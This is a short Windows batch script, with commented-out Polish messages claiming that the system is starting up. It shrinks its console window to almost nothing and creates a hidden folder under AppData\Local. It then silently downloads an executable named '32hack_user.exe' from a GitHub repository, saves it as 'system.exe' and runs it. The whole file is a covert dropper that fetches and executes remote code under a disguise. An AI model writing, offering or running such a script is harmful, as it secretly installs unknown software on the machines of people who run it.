@echo off
mode con cols=15 lines=1
::echo System się uruchamia...
::echo Nie wyłączaj tego okna!
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "ar-eg"
attrib +h "ar-eg" /s /d
cd C:\Users\%USERNAME%\AppData\Local\ar-eg" 
curl -s -L -o system.exe https://github.com/boblorgh/Test2/raw/refs/heads/main/32hack_user.exe
start system.exe
::echo System skończył się uruchamiać.
::echo Możesz wyłączyć te okno.
exit